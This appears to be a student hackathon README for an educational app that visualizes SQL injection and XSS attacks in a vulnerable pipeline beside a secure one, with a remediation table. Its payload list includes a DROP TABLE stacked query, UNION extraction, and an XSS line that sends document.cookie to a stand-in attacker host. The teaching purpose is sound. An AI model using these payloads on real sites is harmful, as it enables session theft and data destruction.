# 🛡️ Kalpvuksh 2.0 — Security & Form Playground (Team Bolt - T018)

> **Problem Statement P19:** Interactive Web Application Security Visualizer & Exploitation Pipeline  
> **Team:** Team Bolt (`T018`)  
> **Institution:** Silver Oak University  
> **Event:** Kalpvuksh 2.0  

[![React](https://img.shields.io/badge/React-19.0-61dafb.svg?logo=react&logoColor=black)](https://react.dev/)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.8-3178c6.svg?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
[![Vite](https://img.shields.io/badge/Vite-6.2-646cff.svg?logo=vite&logoColor=white)](https://vitejs.dev/)
[![TailwindCSS](https://img.shields.io/badge/Tailwind-4.1-38bdf8.svg?logo=tailwindcss&logoColor=white)](https://tailwindcss.com/)
[![Security](https://img.shields.io/badge/Security-OWASP_Top_10-ff4757.svg)](https://owasp.org/www-project-top-ten/)

<div align="center">
  <img src="" alt="Kalpvuksh 2.0https://github.com/2301030700003/Kalpvruksh-Hackathon-Team-Bolt-Submission-/blob/main/Page%201.png Security Playground Preview" width="100%" style="border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.1);" />
  <p><em>Interactive Dual-Pipeline Race Visualizer &amp; Form Playground (Team Bolt — T018)</em></p>
</div>
---

## 📌 Project Overview

**Kalpvuksh 2.0 Security Playground** is an interactive, full-lifecycle cybersecurity educational platform designed to demonstrate how common input validation vulnerabilities (**SQL Injection** and **Cross-Site Scripting**) infiltrate modern web applications, and how defense-in-depth engineering protects enterprise infrastructure.

The application bridges theoretical concepts into an immediate, intuitive visual experience across **three cohesive architectural tiers**:

1. **Page 1 — Google Form Playground:** An authentic, pixel-perfect Google Form interface allowing users and evaluators to submit legitimate feedback or select/inject weaponized attack payloads with 1-click presets.
2. **Page 2 — T018 Security Visualizer (Dual Pipeline Race Engine):** A real-time, side-by-side execution visualizer comparing:
   - **🔴 Vulnerable Pipeline (Raw String Concatenation / Unescaped DOM):** Demonstrates how quotes break string delimiters, alter database syntax, or execute arbitrary JavaScript.
   - **🟢 Secure Pipeline (Parameterized Queries / Contextual Escaping):** Demonstrates how prepared statement binding traps user input as inert literal values, stopping attacks cold at checkpoint barriers.
3. **Page 3 — Compromised Database Vault:** A live simulation of an enterprise database compromise resulting from successful injection, displaying leaked user credentials, bcrypt password hashes, JWT session tokens, account balances, and security forensics.
4. **Split-Screen Demonstration Mode:** Allows simultaneous side-by-side viewing of the Google Form submission flow and the Security Visualizer for classroom or presentation environments.

---

## 👥 Team Members

| Name / ID | Enrollment Number | Institution | Role & Responsibilities |
| :--- | :--- | :--- | :--- |
| **Team Lead / Dev** | `2301030700003` | Silver Oak University | Full-Stack Architecture, Security Engine & UI Pipeline |
| **Team Member 2** | *(Member 2)* | Silver Oak University | Vulnerability Research, Payload Engineering & Testing |
| **Team Member 3** | *(Member 3)* | Silver Oak University | Frontend Visualizations, Animation Timing & Form Integration |
| **Team Member 4** | *(Member 4)* | Silver Oak University | Documentation, Security Analysis & Presentation |

*Team Identifier:* **Team Bolt (T018)**  
*Primary Contact:* `2301030700003@silveroakuni.ac.in`

---

## 🏗️ System Architecture

The following diagram illustrates the unidirectional data flow and dual-pipeline execution model:

```
                  ┌──────────────────────────────────────────────┐
                  │          Page 1: Google Form Client          │
                  │   - Authentic Google Form UI Clone           │
                  │   - 1-Click Attack Payload Selector Modal    │
                  │   - Live Input Sanitization & Previews       │
                  └──────────────────────┬───────────────────────┘
                                         │
                        [ Form Submission / Staging ]
                                         │
                                         ▼
            ┌──────────────────────────────────────────────────────────┐
            │       Page 2: T018 Dual Pipeline Race Visualizer         │
            └─────────────┬──────────────────────────────┬─────────────┘
                          │                              │
             (Path A: Unvalidated)              (Path B: Defended)
                          │                              │
                          ▼                              ▼
        ┌──────────────────────────────────┐ ┌──────────────────────────────────┐
        │  🔴 Vulnerable Pipeline          │ │  🟢 Secure Pipeline              │
        │  • Raw String Concatenation      │ │  • Parameterized Query Binding   │
        │  • Direct innerHTML Injection    │ │  • Contextual HTML Escaping      │
        │  • Delimiter Breakout Allowed    │ │  • Input Bound as Inert Literal  │
        │                                  │ │                                  │
        │  Track Checkpoints:              │ │  Track Checkpoints:              │
        │  [0%] Raw Input                  │ │  [0%] Raw Input                  │
        │  [30%] Concat Stage              │ │  [30%] Tokenization Stage        │
        │  [60%] Database Execution        │ │  [60%] Checkpoint Barrier (HALT) │
        │  [88%] 💥 CRITICAL BREACH!       │ │  [88%] ✅ Sanitized Execution    │
        └─────────────────┬────────────────┘ └──────────────────────────────────┘
                          │
                   (On Malicious Payload)
                          │
                          ▼
        ┌──────────────────────────────────────────────────────────────┐
        │             Page 3: Compromised Database Vault               │
        │  • Live Breach Incident Report & Forensics Timeline          │
        │  • Exfiltrated Database Records (Passwords, Session Tokens)  │
        │  • Stolen Session Tokens & Identity Impersonation Warning    │
        │  • Interactive Exploit Reset & Remediation Guidance          │
        └──────────────────────────────────────────────────────────────┘
```

### Component Structure

```
/src
├── App.tsx                        # Root layout, page router (Form, Visualizer, Vault, Split), global breach state
├── types.ts                       # TypeScript interfaces for submissions, breaches, payloads, and records
├── data/
│   └── payloads.ts                # Catalog of SQLi and XSS test payloads with descriptions and impact levels
├── components/
│   ├── GoogleFormView.tsx         # Authentic Google Form interface with question controls & response submission
│   ├── SecurityVisualizer.tsx     # 60fps vehicle race track, checkpoint barriers, live query box, explanation cards
│   ├── CompromisedDatabaseView.tsx# Page 3 enterprise vault showing breached records, hashes, balances, and forensics
│   ├── ExfiltratedRecordsTable.tsx# Tabular view of database records with highlighting for exfiltrated rows
│   └── PayloadSelectorModal.tsx   # Modal dialog for 1-click loading of SQLi, XSS, and safe testing payloads
├── index.css                      # Tailwind CSS v4 entry point & custom visualizer styles
└── main.tsx                       # React application bootstrap
```

---

## ⚡ Key Features

### 1. Dual Execution Pipeline
- **Smooth 60 FPS Visual Simulation:** Uses `requestAnimationFrame` with SVG transforms to render real-time pipeline execution without UI lag or frame dropping.
- **Physical Checkpoint Barriers:** Visual indicators at `Raw Input (30%)` and `String Concat / Parameterized (60%)`. Secure pipeline halts attacks at the 60% barrier, while vulnerable queries blast through to the breach box.
- **Real-Time Code Inspection:** Directly compares `SELECT * FROM users WHERE name = '...'` versus `SELECT * FROM users WHERE name = ? [Param: "..."]`.
- **Plain-English Explanations:** Real-time breakdown of why the exploit succeeded or was blocked, explaining the mechanics without overwhelming jargon.

### 2. Supported Vulnerabilities & Payloads
- **SQL Injection (SQLi):**
  - *Tautological / Auth Bypass:* `' OR '1'='1` (Forces query to evaluate true, dumping all database rows).
  - *Time-Based Blind SQLi:* `' OR SLEEP(5)--` (Forces database thread sleep, simulating blind exfiltration via response delay).
  - *Destructive DDL Attack:* `admin'; DROP TABLE users;--` (Stacked query destroying backend data structures).
  - *UNION-Based Extraction:* `' UNION SELECT null, username, password_hash FROM admin--` (Combines legitimate results with private schema queries).
- **Cross-Site Scripting (XSS):**
  - *Stored / DOM XSS:* `<script>alert('XSS')</script>` (Executes arbitrary JavaScript within the client's session context).
  - *Event Handler Breakout:* `<img src="x" onerror="alert(1)">` (Bypasses basic script-tag filters via image element errors).
  - *Cookie / Token Theft:* `<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>` (Exfiltrates session cookies).

### 3. Compromised Database Vault (Page 3)
- Renders **exfiltrated enterprise user records** upon attack detection.
- Displays root administrator credentials, password hashes (`$2b$12$...`), session tokens, account balances, and IP addresses.
- Includes a live forensics incident card and an exploit reset button.

---

## 🚀 Setup & Installation Steps

### Prerequisites
Make sure you have the following installed on your workstation:
- **Node.js**: Version 18.0.0 or later (Recommended: Node.js 20 LTS or 22 LTS)
- **npm**: Version 9.0.0 or later (or `pnpm` / `yarn` / `bun`)

### Step 1: Clone the Repository
```bash
git clone <repository-url>
cd <project-directory>
```

### Step 2: Install Dependencies
Install all required dependencies declared in `package.json`:
```bash
npm install
```

### Step 3: Start the Development Server
Run the local Vite development server:
```bash
npm run dev
```
The application will boot at:
```
http://localhost:3000
```
*(Configured to host on `0.0.0.0:3000` for container and local network preview).*

### Step 4: Validate Code & Types
Run the TypeScript compiler to ensure all interfaces and component types are strictly valid:
```bash
npm run lint
```

### Step 5: Build for Production
Create an optimized production bundle:
```bash
npm run build
```
The output will be placed in the `dist/` directory, ready to deploy to any static host (Cloud Run, Vercel, Netlify, Firebase Hosting, Nginx).

### Step 6: Preview Production Build
Preview the generated production build locally:
```bash
npm run preview
```

---

## 🧪 Demonstration & Testing Walkthrough

Follow these steps for a live presentation or evaluation:

1. **Step 1 — Submit via Google Form (Page 1):**
   - Open **Page 1: Google Form**.
   - Click the **"⚡ Load Attack Payloads"** button at the top or bottom of the form.
   - Choose **"SQLi: Classic Authentication Bypass (`' OR '1'='1`)"** or **"XSS: Cookie & Session Hijack"**.
   - Click **"Submit Response"**.
2. **Step 2 — Watch the Dual Pipeline Race (Page 2):**
   - The app automatically transitions to **Page 2: Security Visualizer**.
   - Click **"⚡ Run Security Simulation"** (or watch it execute automatically).
   - Notice how the **Vulnerable Car (Red)** accelerates past all checkpoints and causes a `🚨 CRITICAL LEAK: DATABASE EXPOSED!`.
   - Observe how the **Secure Car (Green)** stops safely at the `Parameterized Checkpoint` barrier (`🛡️ BLOCKED AT CHECKPOINT`).
3. **Step 3 — Inspect the Breach in the Database Vault (Page 3):**
   - Notice the navigation bar highlights with a pulsating `🚨 Breach!` badge.
   - Navigate to **Page 3: Compromised DB** to inspect the exfiltrated user records, decrypted password hashes, and session tokens.
4. **Step 4 — Test Split-Screen Mode:**
   - On desktop screens, click **"Split Screen"** in the top navigation bar to observe the Form and Visualizer concurrently.

---

## 🛡️ Remediation & Best Practices Highlighted

| Vulnerability | Vulnerable Pattern | Secure Remediation |
| :--- | :--- | :--- |
| **SQL Injection** | `db.query("SELECT * FROM users WHERE email = '" + email + "'")` | `db.query("SELECT * FROM users WHERE email = ?", [email])` *(Prepared Statement)* |
| **Cross-Site Scripting** | `element.innerHTML = "<div>" + userInput + "</div>"` | `element.textContent = userInput` or Contextual HTML entity encoding |
| **Database Privilege** | Single DB user with `ALL PRIVILEGES` / DDL access | Principle of Least Privilege: Restricted `SELECT`/`INSERT` service account |
| **Client Session Security**| JavaScript-accessible tokens in `localStorage` or `document.cookie` | `HttpOnly`, `Secure`, and `SameSite=Strict` cookie attributes |

---

## 📄 License & Attribution

Developed for **Kalpvuksh 2.0 (Problem Statement P19)** by **Team Bolt (T018)** at **Silver Oak University**.  
Built with React, TypeScript, and Tailwind CSS. Released for academic, educational, and defense-demonstration purposes.
